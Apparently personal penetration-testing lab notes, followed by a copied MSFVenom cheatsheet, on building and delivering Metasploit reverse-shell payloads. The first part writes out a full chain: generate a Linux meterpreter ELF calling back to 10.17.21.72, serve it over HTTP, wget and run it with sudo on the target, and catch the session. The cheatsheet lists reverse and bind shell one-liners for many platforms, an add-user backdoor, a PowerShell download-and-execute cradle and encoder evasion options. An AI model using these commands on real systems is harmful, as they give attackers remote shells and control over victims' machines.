
```bash

Attackbox - 

# create a payload be sure with targets x86, x64, OS
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.17.21.72 LPORT=8080 -f elf > rev64_shell.elf

# start a server to send the payload to target
python3 -m http.server 9000

# start with the listener
msfconsole
use exploit/multi/handler
msf exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp 
msf exploit(multi/handler) > set lhost 10.17.21.72
msf exploit(multi/handler) > set lport 8080
msf exploit(multi/handler) > run
meterpreter > ls


Target - 

# sudo
sudo su

# Download the payload on the target
wget http://10.17.21.72:9000/rev64_shell.elf -O rev64_shell.elf

# make the payload executable
chmod +x rev64_shell.elf

# run the payload
sudo ./rev64_shell.elf




```



msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.17.21.72 LPORT=8080 -f elf > rev64_shell.elf

python3 -m http.server 9000
![[Pasted image 20250909121644.png]]

sudo su
wget http://10.17.21.72:9000/rev64_shell.elf -O rev64_shell.elf
chmod +x rev64_shell.elf
sudo ./rev64_shell.elf

![[Pasted image 20250909121754.png]]
![[Pasted image 20250909122032.png]]

msfconsole
![[Pasted image 20250909121818.png]]

msf exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp payload => linux/x64/meterpreter/reverse_tcp 
msf exploit(multi/handler) > set lhost 10.17.21.72 lhost => 10.17.21.72 
msf exploit(multi/handler) > set lport 8080 lport => 8080 
meterpreter > ls
![[Pasted image 20250909121948.png]]

---

Windows
![[Pasted image 20250910031237.png]]
![[Pasted image 20250910031337.png]]

---

Windows  
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`  
  
PHP  
`msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`  
  
ASP  
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp`  
  
Python  
`msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`

---

# MSFVenom Cheatsheet

[](https://github.com/frizb/MSF-Venom-Cheatsheet#msfvenom-cheatsheet-1)

| MSFVenom Payload Generation One-Liner                                                                                                                                                                                   | Description                                     |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------- |
| msfvenom -l payloads                                                                                                                                                                                                    | List available payloads                         |
| msfvenom -p PAYLOAD --list-options                                                                                                                                                                                      | List payload options                            |
| msfvenom -p PAYLOAD -e ENCODER -f FORMAT -i ENCODE COUNT LHOST=IP                                                                                                                                                       | Payload Encoding                                |
| msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf                                                                                                                                    | Linux Meterpreter reverse shell x86 multi stage |
| msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf                                                                                                                                       | Linux Meterpreter bind shell x86 multi stage    |
| msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf                                                                                                                                             | Linux bind shell x64 single stage               |
| msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf                                                                                                                                          | Linux reverse shell x64 single stage            |
| msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe                                                                                                                                      | Windows Meterpreter reverse shell               |
| msfvenom -p windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe | Windows Meterpreter http reverse shell          |
| msfvenom -p windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe > shell.exe                                                                                                                                        | Windows Meterpreter bind shell                  |
| msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe                                                                                                                                            | Windows CMD Multi Stage                         |
| msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe                                                                                                                                            | Windows CMD Single Stage                        |
| msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe                                                                                                                                              | Windows add user                                |
| msfvenom -p osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho > shell.macho                                                                                                                                        | Mac Reverse Shell                               |
| msfvenom -p osx/x86/shell_bind_tcp RHOST=IP LPORT=PORT -f macho > shell.macho                                                                                                                                           | Mac Bind shell                                  |
| msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw > shell.py                                                                                                                                               | Python Shell                                    |
| msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > shell.sh                                                                                                                                                 | BASH Shell                                      |
| msfvenom -p cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw > shell.pl                                                                                                                                                 | PERL Shell                                      |
| msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.asp                                                                                                                                      | ASP Meterpreter shell                           |
| msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp                                                                                                                                           | JSP Shell                                       |
| msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war                                                                                                                                           | WAR Shell                                       |
| msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.php cat shell.php                                                                                                                            | pbcopy && echo '?php '                          |
| msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw > phpreverseshell.php                                                                                                                                            | Php Reverse Shell                               |
| msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('[http://IP/nishang.ps1')\](http://ip/nishang.ps1'\)%5C)"" -f python                                  | Windows Exec Nishang Powershell in python       |
| msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/shikata_ga_nai -b "\x04\xA0"                                                                                                     | Bad characters shikata_ga_nai                   |
| msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/fnstenv_mov -b "\x04\xA0"                                                                                                        | Bad characters fnstenv_mov                      |

# Multihandler Listener

[](https://github.com/frizb/MSF-Venom-Cheatsheet#multihandler-listener)

To get multiple session on a single multi/handler, you need to set the ExitOnSession option to false and run the exploit -j instead of just the exploit. For example, for meterpreter/reverse_tcp payload,

```
msf>use exploit/multi/handler  
msf>set payload windows/meterpreter/reverse_tcp  
msf>set lhost <IP>  
msf>set lport <PORT>  
msf> set ExitOnSession false  
msf>exploit -j  
```

The -j option is to keep all the connected session in the background.